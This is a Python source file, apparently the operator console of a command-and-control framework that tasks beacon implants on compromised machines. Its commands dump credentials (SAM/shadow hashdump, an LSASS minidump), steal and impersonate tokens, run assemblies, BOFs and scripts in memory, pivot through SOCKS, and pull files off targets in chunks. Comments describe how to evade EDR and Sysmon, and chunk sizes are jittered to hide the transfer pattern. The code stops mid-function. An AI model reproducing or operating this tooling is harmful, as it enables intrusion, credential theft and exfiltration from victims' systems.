"""Operator console for the beacon subsystem.

Mirrors the interactive feel of the shell handler while working against
a task queue. Every command enqueues a task and blocks on its result;
the wait is bounded by TASK_TIMEOUT. This is the operator-facing view
of a fundamentally asynchronous channel.
"""

from __future__ import annotations

import base64 as _b64
import gzip as _gzip
import os as _os
import queue as _queue
import sys
import threading
import time

from . import constants


class BeaconConsole:

    NATIVE_VERBS = frozenset({
        'cat', 'ls', 'ps', 'env', 'pwd', 'whoami', 'id',
        'hostname', 'uname', 'readfile',
        'find', 'grep', 'head', 'tail', 'stat',
        'strings', 'hexdump', 'sha1', 'sha256', 'md5',
        'readlink', 'realpath', 'du',
        'mkdir', 'rm', 'cp', 'mv', 'chmod',
        'ln', 'touch',
        'wc', 'nl', 'rev', 'sort', 'uniq', 'tr', 'cksum',
        'base64', 'gzip', 'gunzip',
        'which', 'ifconfig',
        'curl', 'resolve', 'nc',
        'df', 'uptime', 'date', 'getpid', 'getppid',
        'netstat', 'arp', 'route',
        'users', 'groups', 'av-list',
        'screenshot',
        'make_token', 'rev2self', 'runas',
    })

    STRUCTURED_VERBS = frozenset({
        'hashdump', 'enablepriv', 'lsassdump',
    })

    SHELL_METACHARS = frozenset('|&;<>()`$*?[]~')

    UNIX_ONLY_VERBS = frozenset({
        'readlink', 'chmod', 'ln',
    })

    WINDOWS_ONLY_VERBS = frozenset()

    @staticmethod
    def _unquote(arg: str) -> str:
        """Strip a single pair of surrounding single or double quotes.

        Lets `find /tmp '*.log'` deliver the literal pattern `*.log`
        to the agent instead of the shell-glob string with quotes.
        Matches one character of quote on each side only; nested or
        mismatched quotes pass through untouched.
        """
        if len(arg) >= 2:
            first, last = arg[0], arg[-1]
            if first == last and first in ("'", '"'):
                return arg[1:-1]
        return arg

    def __init__(self, engine, handler):
        self.engine = engine
        self.handler = handler
        self.c = handler.colors

    # ------------------------------------------------------------------
    # Credential collection

    def _cmd_hashdump(self, session, parts) -> None:
        """hashdump [<outdir>]

        Windows: reads SAM and SYSTEM, writes them to a directory on
        the handler's own filesystem, runs secretsdump.py against them
        if it is on PATH. Linux: reads /etc/passwd and /etc/shadow,
        merges into unshadow(8) format, writes all three files.
        """
        import base64 as _b64
        import hashlib as _hl
        import json as _json
        import os as _os
        import shutil
        import subprocess
        import time as _time

        c = self.c
        print(f"{c['cyan']}[*] reading credential material from "
              f"#{session.id}{c['end']}")

        self._dispatch(session, ['hashdump'],
                       blocking=True, task_timeout=180, wait_timeout=200)

    def _cmd_enablepriv(self, session, parts) -> None:
        """enablepriv — list, enable, or disable Windows token
        privileges on the current process."""
        import json as _json

        c = self.c
        if session.identity.get('os') != 'windows':
            print(f"{c['red']}enablepriv is Windows-only. This "
                  f"session is {session.identity.get('os','?')}"
                  f"{c['end']}")
            return

        self._dispatch(session, ['enablepriv'] + list(parts[1:]),
                       blocking=True, task_timeout=60, wait_timeout=80)

    def _cmd_lsassdump(self, session, parts) -> None:
        """lsassdump --dump [--fork] [--duplicate] [--elevate]
                     [--out <path>]"""
        c = self.c
        if session.identity.get('os') != 'windows':
            print(f"{c['red']}lsassdump is Windows-only. This "
                  f"session is {session.identity.get('os','?')}"
                  f"{c['end']}")
            return

        if not parts[1:] or '--dump' not in parts[1:]:
            print(f"{c['red']}lsassdump: --dump is required"
                  f"{c['end']}")
            print(f"  {c['dim']}usage: lsassdump --dump [--fork] "
                  f"[--duplicate] [--elevate] [--out <path>]"
                  f"{c['end']}")
            return

        print()
        print(f"  {c['yellow']}{c['bold']}lsassdump will create a "
              f"minidump of LSASS on the target.{c['end']}")
        print(f"  {c['dim']}This is the highest-signal action the "
              f"framework can take. Every EDR watches for the LSASS "
              f"ProcessAccess event, the MiniDumpWriteDump import, "
              f"and the NtCreateProcessEx-from-LSASS pattern. The "
              f"verb runs in-process through syscall; it is not a "
              f"subprocess and it will not appear in Sysmon EventID 1 "
              f"— but the action itself is the signature."
              f"{c['end']}")
        try:
            ans = input(
                f"  {c['green']}proceed? [y/N]{c['end']} "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"{c['dim']}cancelled{c['end']}")
            return
        if ans not in ('y', 'yes'):
            print(f"{c['dim']}cancelled{c['end']}")
            return

        self._dispatch(session, ['lsassdump'] + list(parts[1:]),
                       blocking=True, task_timeout=300, wait_timeout=320)

    # ------------------------------------------------------------------
    # Session listing

    def print_list(self) -> None:
        sessions = self.engine.list_all()
        alive = [s for s in sessions if s.alive]
        print(f"\n{self.c['cyan']}BEACONS | Active: {len(alive)}"
              f"{self.c['end']}")
        if not sessions:
            print(f"{self.c['yellow']}No beacons seen{self.c['end']}")
            return
        for s in sessions:
            dot = (f"{self.c['green']}●{self.c['end']}" if s.alive
                   else f"{self.c['red']}○{self.c['end']}")
            ident = s.identity
            os_name = ident.get('os', '?')
            arch = ident.get('arch', '')
            rejected = getattr(s, 'rejected_results', 0)
            extra = ""
            if rejected:
                extra = f" {self.c['red']}rejected={rejected}{self.c['end']}"
            print(
                f"  {dot} #{s.id:<3} {s.display_name} "
                f"[{os_name}/{arch}] "
                f"sleep={s.sleep_interval}s "
                f"last={s.age}s "
                f"checkins={s.checkins} "
                f"addr={s.last_addr or '?'}"
                f"{extra}"
            )

    # ------------------------------------------------------------------
    # Interactive session

    def attach(self, session_id: int) -> None:
        session = self.engine.get(session_id)
        if session is None:
            print(f"{self.c['red']}Beacon #{session_id} not found"
                  f"{self.c['end']}")
            return

        if not session.alive:
            print(
                f"{self.c['yellow']}Warning: beacon #{session_id} has "
                f"not checked in for {session.age}s "
                f"(sleep={session.sleep_interval}s). Commands will queue "
                f"and likely time out.{self.c['end']}"
            )
            answer = ""
            try:
                answer = input(
                    f"{self.c['yellow']}Attach anyway? [y/N]: "
                    f"{self.c['end']}"
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if answer not in ('y', 'yes'):
                return

        self._print_banner(session)
        self.handler._set_completer_mode('beacon')

        try:
            while True:
                self._flush_unread(session)
                try:
                    line = input(self._prompt(session)).strip()
                except (KeyboardInterrupt, EOFError):
                    print()
                    return
                if not line:
                    continue

                parts = line.split()
                cmd = parts[0].lower()

                if cmd in ('exit', 'quit', 'back', 'detach'):
                    return
                if cmd in ('socks', 'pivot'):
                    self._cmd_socks(session, parts)
                    continue
                if cmd in ('steal_token', 'stealtoken'):
                    self._cmd_steal_token(session, parts)
                    continue
                if cmd == 'help':
                    self._print_help()
                    continue
                if cmd == 'sleep':
                    self._cmd_sleep(session, parts)
                    continue
                if cmd in ('workhours', 'wh'):
                    self._cmd_workhours(session, parts)
                    continue
                if cmd == 'kill':
                    self._cmd_kill(session)
                    if self.engine.get(session.id) is None:
                        return
                    continue
                if cmd == 'info':
                    self._print_info(session)
                    continue
                if cmd == 'tasks':
                    self._cmd_tasks(session)
                    continue
                if cmd == 'graph':
                    self._cmd_graph(parts)
                    continue
                if cmd == 'schedule':
                    self._cmd_schedule(session, parts)
                    continue
                if cmd == 'wait':
                    self._cmd_wait(session, parts)
                    continue
                if cmd == 'export':
                    self._cmd_export(session, parts)
                    continue
                if cmd in ('forget', 'remove') or (cmd == 'rm' and len(parts) == 1):
                    if self._cmd_forget(session):
                        return
                    continue

                if cmd in ('pyexec', 'psexec', 'shexec'):
                    if len(parts) < 2:
                        print(f"{self.c['red']}Usage: {cmd} <local_file> "
                              f"[-- args...]{self.c['end']}")
                        continue
                    self._dispatch_script(session, cmd, parts[1:])
                    continue

                if cmd == 'hashdump':
                    self._cmd_hashdump(session, parts)
                    continue
                if cmd == 'enablepriv':
                    self._cmd_enablepriv(session, parts)
                    continue
                if cmd == 'lsassdump':
                    self._cmd_lsassdump(session, parts)
                    continue
                if cmd == 'migrate':
                    self._cmd_migrate(session, parts)
                    continue

                if cmd == 'upload':
                    if len(parts) < 3:
                        print(f"{self.c['red']}Usage: upload <local_file> "
                              f"<remote_path>{self.c['end']}")
                        continue
                    self._cmd_upload(session, parts[1], parts[2])
                    continue

                if cmd == 'download':
                    if len(parts) < 3:
                        print(f"{self.c['red']}Usage: download "
                              f"<remote_path> <local_file>{self.c['end']}")
                        continue
                    self._cmd_download(session, parts[1], parts[2])
                    continue

                if cmd == 'execmem':
                    if len(parts) < 3:
                        print(f"{self.c['red']}Usage: execmem <remote_path> "
                              f"<exe|elf> [-- args...]{self.c['end']}")
                        continue
                    self._cmd_execmem(session, parts[1], parts[2], parts[3:])
                    continue

                if cmd == 'bof':
                    if len(parts) < 2:
                        print(f"{self.c['red']}Usage: bof <name_or_path> "
                              f"[args...]{self.c['end']}")
                        print(f"{self.c['yellow']}Run `bof-list` to see "
                              f"registered BOFs, or pass a path to a local "
                              f".o / .obj file.{self.c['end']}")
                        continue
                    self._cmd_bof(session, parts[1], parts[2:])
                    continue

                if cmd == 'bof-list':
                    self._cmd_bof_list(session)
                    continue

                if cmd in ('execute-assembly', 'execute_assembly'):
                    self._cmd_execute_assembly(session, parts)
                    continue

                if cmd == 'exec':
                    if len(parts) < 2:
                        print(f"{self.c['red']}Usage: exec <cmd> [args...]"
                              f"{self.c['end']}")
                        continue
                    self._dispatch(session, parts)
                    continue

                has_shell_syntax = any(c in self.SHELL_METACHARS for c in line)
                _target_os = session.identity.get('os', '')
                _allowed_native = self.NATIVE_VERBS
                if _target_os == 'windows':
                    _allowed_native = (self.NATIVE_VERBS
                                       - self.UNIX_ONLY_VERBS)
                elif _target_os == 'linux':
                    _allowed_native = (self.NATIVE_VERBS
                                       - self.WINDOWS_ONLY_VERBS)

                if cmd in _allowed_native and not has_shell_syntax:
                    parts = [parts[0]] + [self._unquote(p) for p in parts[1:]]
                    self._dispatch(session, parts)
                    continue

                if cmd == 'extension':
                    if len(parts) < 2:
                        print(f"{self.c['red']}Usage: extension "
                              f"<list|info|load|unload|list-loaded"
                              f"|call> [...]{self.c['end']}")
                        continue
                    sub = parts[1].lower()
                    if sub == 'list':
                        self._cmd_extension_list()
                    elif sub == 'info' and len(parts) >= 3:
                        self._cmd_extension_info(parts[2])
                    elif sub == 'load' and len(parts) >= 3:
                        self._cmd_extension_load(session, parts[2])
                    elif sub == 'unload' and len(parts) >= 3:
                        self._cmd_extension_unload(session, parts[2])
                    elif sub == 'list-loaded':
                        self._cmd_extension_list_loaded(session)
                    elif sub == 'call' and len(parts) >= 3:
                        self._cmd_extension_call(
                            session, parts[2], parts[3:])
                    else:
                        print(f"{self.c['red']}Unknown extension "
                              f"subcommand{self.c['end']}")
                    continue

                _exts = self._list_local_extensions()
                if cmd in _exts and cmd not in self.NATIVE_VERBS:
                    self._cmd_extension_call(session, cmd, parts[1:])
                    continue

                self._dispatch(session, parts, force_verb='sh')
        finally:
            self.handler._set_completer_mode('main')

    # ------------------------------------------------------------------
    # Dispatch

    def _dispatch(self, session, parts, force_verb=None,
                  task_timeout=120, wait_timeout=None,
                  blocking=False) -> None:
        """Queue a task.

        By default, returns immediately after enqueueing. The result
        is delivered asynchronously by a background thread and printed
        when it arrives — the operator can continue issuing commands
        without waiting.

        With `blocking=True`, waits for the result and prints it
        inline. Only `_cmd_upload` uses this mode today, for the
        truncate and verify handshake steps. `execmem` and `bof` run
        async so the operator can keep typing while a long payload
        executes; the output prints when it arrives.

        `wait_timeout` caps the per-task wait when blocking, and the
        background worker's wait when not.
        """
        if force_verb is not None:
            verb = force_verb
            args = list(parts)
        else:
            verb = parts[0]
            args = parts[1:]

        self._flush_unread(session)

        task_id = self.engine.enqueue(session.id, verb, args,
                                      timeout=task_timeout)
        if task_id is None:
            print(f"{self.c['red']}Failed to enqueue "
                  f"(queue full or session gone){self.c['end']}")
            return

        waiter = self.engine.take_waiter(task_id)
        if waiter is None:
            with session._pending_lock:
                already = next(
                    (r for r in reversed(session.results)
                     if r.id == task_id), None)
            if already is not None:
                if already.error:
                    print(f"{self.c['red']}[{task_id}] {verb}: "
                          f"{already.error}{self.c['end']}")
                else:
                    try:
                        text = already.output.decode(
                            'utf-8', errors='replace')
                    except Exception:
                        text = '<non-utf8 output>'
                    if not text.endswith('\n'):
                        text += '\n'
                    print(f"{self.c['cyan']}[{task_id}] {verb}:"
                          f"{self.c['end']}")
                    print(text, end='')
                return

        if not session.alive:
            print(f"{self.c['yellow']}[warn] beacon #{session.id} "
                  f"appears dead (last check-in {session.age}s ago); "
                  f"task may time out{self.c['end']}")

        if blocking:
            print(f"{self.c['yellow']}[{task_id}] queued; "
                  f"awaiting result...{self.c['end']}")
            wait_for = wait_timeout if wait_timeout is not None \
                       else constants.TASK_TIMEOUT
            if not session.alive:
                wait_for = 30.0
            start = time.time()
            result = waiter.wait(timeout=wait_for) if waiter else None
            elapsed = time.time() - start

            sys.stdout.write("\r" + " " * 78 + "\r")

            if result is None:
                print(f"{self.c['red']}[{task_id}] timed out after "
                      f"{elapsed:.0f}s{self.c['end']}")
                return
            if result.error:
                print(f"{self.c['red']}[{task_id}] error: "
                      f"{result.error}{self.c['end']}")
                return

            text = result.output.decode('utf-8', errors='replace')
            if not text.endswith('\n'):
                text += '\n'
            print(text, end='')
            return

        if waiter is not None:
            quick = waiter.wait(timeout=0.25)
            if quick is not None:
                if quick.error:
                    print(f"{self.c['red']}[{task_id}] {verb}: "
                          f"{quick.error}{self.c['end']}")
                    return
                try:
                    text = quick.output.decode(
                        'utf-8', errors='replace')
                except Exception:
                    text = '<non-utf8 output>'
                if not text.endswith('\n'):
                    text += '\n'
                print(f"{self.c['cyan']}[{task_id}] {verb}:"
                      f"{self.c['end']}")
                print(text, end='')
                return

        print(f"{self.c['cyan']}[{task_id}] {verb}: queued"
              f"{self.c['end']}")
        threading.Thread(
            target=self._wait_for_result,
            args=(session, task_id, waiter, verb, args, wait_timeout),
            daemon=True,
        ).start()

    # ------------------------------------------------------------------
    # Async result delivery

    def _wait_for_result(self, session, task_id, waiter, verb, args,
                         wait_timeout=None):
        """Background worker: block on the waiter, push the result to
        the session's unread queue, then try to flush.

        Called from a daemon thread spawned by `_dispatch`. One thread
        per task; the thread exits as soon as the result arrives or
        the timeout fires.
        """
        if waiter is None:
            return
        if session.alive:
            timeout = wait_timeout if wait_timeout is not None \
                      else constants.TASK_TIMEOUT
        else:
            timeout = 30.0
        result = waiter.wait(timeout=timeout)
        try:
            session.unread_results.put_nowait(
                (task_id, verb, args, result))
        except _queue.Full:
            try:
                session.unread_results.get_nowait()
            except _queue.Empty:
                pass
            try:
                session.unread_results.put_nowait(
                    (task_id, verb, args, result))
            except _queue.Full:
                pass
                
        self._flush_unread(session)

    def _flush_unread(self, session) -> None:
        """Drain the unread-results queue and print each entry.

        Called before every prompt, after every dispatch, and from
        the background result worker. Safe to call from any thread.
        """
        printed_anything = False
        while True:
            try:
                task_id, verb, args, result = \
                    session.unread_results.get_nowait()
            except _queue.Empty:
                break

            if not printed_anything:
                sys.stdout.write("\r\n")
                printed_anything = True

            if result is None:
                print(f"{self.c['red']}[{task_id}] {verb}: "
                      f"timed out{self.c['end']}")
                continue
            if result.error:
                print(f"{self.c['red']}[{task_id}] {verb}: "
                      f"{result.error}{self.c['end']}")
                continue

            try:
                text = result.output.decode('utf-8', errors='replace')
            except Exception:
                text = '<non-utf8 output>'
            if not text.endswith('\n'):
                text += '\n'
            print(f"{self.c['cyan']}[{task_id}] {verb}:{self.c['end']}")
            print(text, end='')

        if printed_anything:
            sys.stdout.flush()

    def _cmd_wait(self, session, parts) -> None:
        """Block until pending tasks drain (or a specific task completes)."""
        if len(parts) > 1:
            task_id = parts[1]
            print(f"{self.c['yellow']}waiting for {task_id}..."
                  f"{self.c['end']}")
            start = time.time()
            while time.time() - start < constants.TASK_TIMEOUT:
                self._flush_unread(session)
                with session._pending_lock:
                    still_pending = task_id in session.pending
                if not still_pending:
                    time.sleep(0.2)
                    self._flush_unread(session)
                    return
                time.sleep(0.3)
            print(f"{self.c['red']}{task_id} did not complete within "
                  f"{constants.TASK_TIMEOUT}s{self.c['end']}")
            return

        if session.pending_count() == 0:
            self._flush_unread(session)
            return
        print(f"{self.c['yellow']}waiting for "
              f"{session.pending_count()} pending task(s)..."
              f"{self.c['end']}")
        start = time.time()
        while session.pending_count() > 0:
            self._flush_unread(session)
            if time.time() - start > constants.TASK_TIMEOUT:
                print(f"{self.c['red']}Timed out — "
                      f"{session.pending_count()} still pending"
                      f"{self.c['end']}")
                return
            time.sleep(0.3)
        self._flush_unread(session)

    # ------------------------------------------------------------------
    # In-memory script execution

    def _dispatch_script(self, session, verb, args,
                         max_bytes=1_000_000) -> None:
        """Read a local file, base64-encode it, and dispatch it inline
        as the first task argument. The agent pipes the decoded source
        to the interpreter via stdin, keeping the source out of argv.

        Usage at the console:
            pyexec <local.py> [arg1 arg2 ...]
            psexec <local.ps1> [arg1 arg2 ...]
            shexec <local.sh> [arg1 arg2 ...]

        Args after the local path are passed to the script. If the
        operator did not include an explicit `--` separator, one is
        inserted automatically so the agent knows where the script's
        own arguments begin.
        """
        import base64 as _b64
        import os as _os

        if not args:
            print(f"{self.c['red']}Usage: {verb} <local_file> "
                  f"[-- args...]{self.c['end']}")
            return

        local_path = args[0]
        rest = args[1:]

        if not _os.path.isfile(local_path):
            print(f"{self.c['red']}Local file not found: "
                  f"{local_path}{self.c['end']}")
            return

        size = _os.path.getsize(local_path)
        if size == 0:
            print(f"{self.c['red']}Script is empty: "
                  f"{local_path}{self.c['end']}")
            return
        if size > max_bytes:
            print(f"{self.c['red']}Script too large for inline delivery "
                  f"({size} > {max_bytes} bytes). Use `upload` to stage "
                  f"it, then execute via `execmem` for PE/ELF or "
                  f"`<cmd> <file>` for shell interpreters.{self.c['end']}")
            return

        try:
            with open(local_path, 'rb') as fh:
                raw = fh.read()
        except OSError as exc:
            print(f"{self.c['red']}Read error: {exc}{self.c['end']}")
            return

        b64 = _b64.b64encode(raw).decode('ascii')

        task_args = [b64]
        if rest:
            if '--' not in rest:
                task_args.append('--')
            task_args.extend(rest)

        self._dispatch(session, [verb] + task_args,
                       task_timeout=300, wait_timeout=320)

    # ------------------------------------------------------------------
    # Chunked file transfer

    def _cmd_upload(self, session, local_path, remote_path) -> None:
        """Chunk a local file and queue one writechunk task per chunk.

        Workflow:
          1. Queue a `truncate` task and wait for it. This guarantees
             the remote path is empty regardless of what was there.
          2. Queue N `writechunk` tasks, one per chunk. Each carries
             a base64 blob of at most UPLOAD_CHUNK_SIZE bytes.
          3. Poll session.pending_count() until it drops to zero, or
             the wait timeout expires.
          4. Queue a `sha256file` task, compare against the local
             SHA-256, report.
        """
        import base64 as _b64
        import hashlib as _hl
        import os as _os
        import time as _time

        if not _os.path.isfile(local_path):
            print(f"{self.c['red']}Local file not found: "
                  f"{local_path}{self.c['end']}")
            return

        total = _os.path.getsize(local_path)
        if total == 0:
            print(f"{self.c['red']}File is empty: "
                  f"{local_path}{self.c['end']}")
            return

        if session.sleep_interval > 0:
            print(f"{self.c['yellow']}[tip] beacon sleep is "
                  f"{session.sleep_interval}s — the upload will still "
                  f"work, but will take "
                  f"~{total // constants.UPLOAD_CHUNK_SIZE * session.sleep_interval // 60} "
                  f"minutes. Run `sleep 0` first for a fast transfer."
                  f"{self.c['end']}")

        local_sha = _hl.sha256()
        try:
            with open(local_path, 'rb') as fh:
                while True:
                    block = fh.read(1024 * 1024)
                    if not block:
                        break
                    local_sha.update(block)
        except OSError as exc:
            print(f"{self.c['red']}Read error: {exc}{self.c['end']}")
            return
        local_hex = local_sha.hexdigest()

        print(f"{self.c['cyan']}[*] Chunking {local_path} "
              f"({total} bytes, chunk={constants.UPLOAD_CHUNK_SIZE})"
              f"{self.c['end']}")
        print(f"{self.c['blue']}[*] Local SHA-256: {local_hex}"
              f"{self.c['end']}")

        # ---- Step 1: truncate -----------------------------------
        trunc_id = self.engine.enqueue(
            session.id, 'truncate', [remote_path], timeout=30,
            track=False)
        if trunc_id is None:
            print(f"{self.c['red']}Failed to queue truncate task"
                  f"{self.c['end']}")
            return
        trunc_res = session.await_result(
            trunc_id, timeout=constants.TASK_TIMEOUT)
        if trunc_res is None:
            with session._pending_lock:
                for r in reversed(session.results):
                    if r.id == trunc_id:
                        trunc_res = r
                        break
        if trunc_res is None or trunc_res.error:
            print(f"{self.c['red']}Truncate failed: "
                  f"{trunc_res.error if trunc_res else 'timeout'}"
                  f"{self.c['end']}")
            return

        # ---- Step 2 + 3: batched queue + wait -------------------
        chunk_size = constants.UPLOAD_CHUNK_SIZE
        batch_size = max(1, constants.TASK_QUEUE_LIMIT // 2)

        import random as _random
        low_size = max(4096, chunk_size // 2)
        chunk_plan = []
        remaining = total
        while remaining > 0:
            s = _random.randint(low_size, chunk_size)
            if s > remaining:
                s = remaining
            chunk_plan.append(s)
            remaining -= s
        total_chunks = len(chunk_plan)

        queued = 0
        start = _time.time()
        max_wait = 1800.0
        last_render = -1
        my_task_ids: list = []

        try:
            with open(local_path, 'rb') as fh:
                while queued < total_chunks:
                    # Queue one batch.
                    batch_end = min(queued + batch_size, total_chunks)
                    while queued < batch_end:
                        want = chunk_plan[queued]
                        block = fh.read(want)
                        if not block:
                            break
                        b64 = _b64.b64encode(block).decode('ascii')
                        tid = self.engine.enqueue(
                            session.id, 'writechunk',
                            [b64, remote_path], timeout=120,
                            track=False)
                        if tid is None:
                            print(f"\r{self.c['red']}Queue rejected "
                                  f"chunk {queued}/{total_chunks} — "
                                  f"try a smaller file or `sleep 0` "
                                  f"first{self.c['end']}")
                            return
                        my_task_ids.append(tid)
                        queued += 1

                    while True:
                        with session._pending_lock:
                            done = sum(
                                1 for tid in my_task_ids
                                if tid not in session.pending)
                        if done >= queued:
                            break
                        if done != last_render:
                            bar_width = 30
                            filled = int(bar_width * done / total_chunks)
                            bar = '█' * filled + '░' * (bar_width - filled)
                            print(f"\r{self.c['cyan']}[{bar}] {done}/"
                                  f"{total_chunks} chunks"
                                  f"{self.c['end']}", end='', flush=True)
                            last_render = done
                        if _time.time() - start > max_wait:
                            print(f"\n{self.c['yellow']}[!] Wait cap "
                                  f"reached — chunks still pending. "
                                  f"Use `tasks` to check progress."
                                  f"{self.c['end']}")
                            return
                        _time.sleep(0.5)
        except OSError as exc:
            print(f"\r{self.c['red']}Read error: {exc}{self.c['end']}")
            return

        bar_width = 30
        print(f"\r{self.c['cyan']}[{'█' * bar_width}] {total_chunks}/"
              f"{total_chunks} chunks{self.c['end']}")

        print(f"{self.c['cyan']}[*] All {total_chunks} chunks "
              f"acknowledged in {int(_time.time() - start)}s"
              f"{self.c['end']}")

        # ---- Step 4: verify SHA-256 -----------------------------
        print(f"{self.c['cyan']}[*] Verifying remote SHA-256..."
              f"{self.c['end']}")
        verify_id = self.engine.enqueue(
            session.id, 'sha256file', [remote_path], timeout=120,
            track=False)
        if verify_id is None:
            print(f"{self.c['red']}Failed to queue verify task"
                  f"{self.c['end']}")
            return
        verify_res = session.await_result(
            verify_id, timeout=constants.TASK_TIMEOUT)
        if verify_res is None:
            with session._pending_lock:
                for r in reversed(session.results):
                    if r.id == verify_id:
                        verify_res = r
                        break
        if verify_res is None:
            print(f"{self.c['red']}Verify timed out{self.c['end']}")
            return
        if verify_res.error:
            print(f"{self.c['red']}Verify failed: "
                  f"{verify_res.error}{self.c['end']}")
            return

        try:
            remote_hex = verify_res.output.decode(
                'ascii', errors='replace').strip()
        except Exception:
            remote_hex = ''

        if remote_hex.lower() == local_hex.lower():
            print(f"{self.c['green']}[+] Upload complete — SHA-256 "
                  f"verified{self.c['end']}")
        else:
            print(f"{self.c['red']}[-] SHA-256 mismatch{self.c['end']}")
            print(f"    local:  {local_hex}")
            print(f"    remote: {remote_hex or '(unavailable)'}")

    def _cmd_download(self, session, remote_path, local_path) -> None:
        """Chunked download with SHA-256 verification.

        Workflow:
          1. Queue a `filesize` task and wait. The agent returns the
             exact byte length of the remote file.
          2. Split the file into a randomised chunk plan whose sizes
             fall in [base/2, base] so the wire pattern does not
             correlate to a fixed TornadoRevC2 chunk size.
          3. Queue readchunk tasks in batches, awaiting each chunk and
             writing it to the local file as it arrives.
          4. Queue a `sha256file` task on the target and compare
             against the SHA-256 of the local file.

        OPSEC: every chunk is served by the agent's in-process
        os.Open / Seek / Read path — no subprocess, no argv, no
        process-creation telemetry. Nothing is staged on the target.
        The remote file is opened read-only and closed as soon as the
        last chunk is served.
        """
        import base64 as _b64
        import hashlib as _hl
        import os as _os
        import random as _random
        import time as _time

        # ---- Step 1: remote file size ---------------------------
        print(f"{self.c['cyan']}[*] Querying remote file size..."
              f"{self.c['end']}")
        size_id = self.engine.enqueue(
            session.id, 'filesize', [remote_path], timeout=30,
            track=False)
        if size_id is None:
            print(f"{self.c['red']}Failed to queue filesize task"
                  f"{self.c['end']}")
            return
        size_res = session.await_result(
            size_id, timeout=constants.TASK_TIMEOUT)
        if size_res is None:
            with session._pending_lock:
                for r in reversed(session.results):
                    if r.id == size_id:
                        size_res = r
                        break
        if size_res is None or size_res.error:
            print(f"{self.c['red']}filesize failed: "
                  f"{size_res.error if size_res else 'timeout'}"
                  f"{self.c['end']}")
            return
        try:
            total = int(size_res.output.decode(
                'ascii', errors='replace').strip())
        except Exception:
            print(f"{self.c['red']}Could not parse remote file size"
                  f"{self.c['end']}")
            return

        if total == 0:
            print(f"{self.c['yellow']}[*] Remote file is empty — "
                  f"creating empty local copy{self.c['end']}")
            try:
                open(local_path, 'wb').close()
            except OSError as exc:
                print(f"{self.c['red']}Local write failed: {exc}"
                      f"{self.c['end']}")
            return

        print(f"{self.c['cyan']}[*] Remote file: {total} bytes"
              f"{self.c['end']}")

        if session.sleep_interval > 0:
            est_min = (total // constants.DOWNLOAD_CHUNK_SIZE
                       * session.sleep_interval // 60)
            print(f"{self.c['yellow']}[tip] beacon sleep is "
                  f"{session.sleep_interval}s — the download will "
                  f"take ~{est_min} minutes. Run `sleep 0` first for "
                  f"a fast transfer.{self.c['end']}")

        # ---- Step 2: randomised chunk plan ----------------------
        base = constants.DOWNLOAD_CHUNK_SIZE
        low = max(4096, base // 2)
        chunk_plan = []      # list of (offset, size)
        cursor = 0
        while cursor < total:
            s = _random.randint(low, base)
            if cursor + s > total:
                s = total - cursor
            chunk_plan.append((cursor, s))
            cursor += s
        total_chunks = len(chunk_plan)

        print(f"{self.c['cyan']}[*] Downloading {total_chunks} chunks "
              f"(sizes jittered {low}-{base} bytes){self.c['end']}")

        # ---- Step 3: fetch + write ------------------------------
        batch_size = max(1, constants.TASK_QUEUE_LIMIT // 2)
        done = 0
        start = _time.time()
        max_wait = 1800.0
        last_render = -1

        try:
            with open(local_path, 'wb') as fh:
                while done < total_chunks:
                    batch_end = min(done + batch_size, total_chunks)
                    batch = []      # list of (tid, offset, size)
                    for i in range(done, batch_end):
                        offset, size = chunk_plan[i]
                        tid = self.engine.enqueue(
                            session.id, 'readchunk',
                            [remote_path, str(offset), str(size)],
                            timeout=120, track=False)
                        if tid is None:
                            print(f"\r{self.c['red']}Queue rejected "
                                  f"chunk {i}/{total_chunks}"
                                  f"{self.c['end']}")
                            return
                        batch.append((tid, offset, size))

                    for tid, offset, size in batch:
                        res = session.await_result(
                            tid, timeout=constants.TASK_TIMEOUT)
                        if res is None:
                            with session._pending_lock:
                                for r in reversed(session.results):
                                    if r.id == tid:
                                        res = r
                                        break
                        if res is None:
                            print(f"\r{self.c['red']}Chunk {done} "
                                  f"timed out{self.c['end']}")
                            return
                        if res.error:
                            print(f"\r{self.c['red']}Chunk {done} "
                                  f"error: {res.error}{self.c['end']}")
                            return
                        data = res.output
                        fh.write(data)
                        done += 1

                        if done != last_render:
                            bar_width = 30
                            filled = int(bar_width * done / total_chunks)
                            bar = ('█' * filled
                                   + '░' * (bar_width - filled))
                            print(f"\r{self.c['cyan']}[{bar}] "
                                  f"{done}/{total_chunks} chunks"
                                  f"{self.c['end']}",
                                  end='', flush=True)
                            last_render = done

                    if _time.time() - start > max_wait:
                        print(f"\n{self.c['yellow']}[!] Wait cap "
                              f"reached at {done}/{total_chunks} "
                              f"chunks{self.c['end']}")
                        return

            print(f"\r{self.c['cyan']}[{'█' * 30}] "
                  f"{total_chunks}/{total_chunks} chunks"
                  f"{self.c['end']}")
            print(f"{self.c['cyan']}[*] All {total_chunks} chunks "
                  f"written in {int(_time.time() - start)}s"
                  f"{self.c['end']}")

        except OSError as exc:
            print(f"\r{self.c['red']}Local write error: {exc}"
                  f"{self.c['end']}")
            return

        # ---- Step 4: verify SHA-256 -----------------------------
        print(f"{self.c['cyan']}[*] Verifying remote SHA-256..."
              f"{self.c['end']}")
        local_hex = self._sha256_of(local_path)
        if local_hex is None:
            print(f"{self.c['yellow']}[!] Could not read local file "
                  f"for hash — skipping verification{self.c['end']}")
            return

        verify_id = self.engine.enqueue(
            session.id, 'sha256file', [remote_path], timeout=120,
            track=False)
        if verify_id is None:
            print(f"{self.c['red']}Failed to queue verify task"
                  f"{self.c['end']}")
            return
        verify_res = session.await_result(
            verify_id, timeout=constants.TASK_TIMEOUT)
        if verify_res is None:
            with session._pending_lock:
                for r in reversed(session.results):
                    if r.id == verify_id:
                        verify_res = r
                        break
        if verify_res is None or verify_res.error:
            print(f"{self.c['red']}Verify failed: "
                  f"{verify_res.error if verify_res else 'timeout'}"
                  f"{self.c['end']}")
            return
        try:
            remote_hex = verify_res.output.decode(
                'ascii', errors='replace').strip()
        except Exception:
            remote_hex = ''

        if remote_hex.lower() == local_hex.lower():
            print(f"{self.c['green']}[+] Download complete — SHA-256 "
                  f"verified{self.c['end']}")
        else:
            print(f"{self.c['red']}[-] SHA-256 mismatch{self.c['end']}")
            print(f"    local:  {local_hex}")
            print(f"    remote: {remote_hex or '(unavailable)'}")

    @staticmethod
    def _sha256_of(path):
        """Return the hex SHA-256 of a local file, or None on error."""
        import hashlib as _hl
        h = _hl.sha256()
        try:
            with open(path, 'rb') as fh:
                while True:
                    block = fh.read(1024 * 1024)
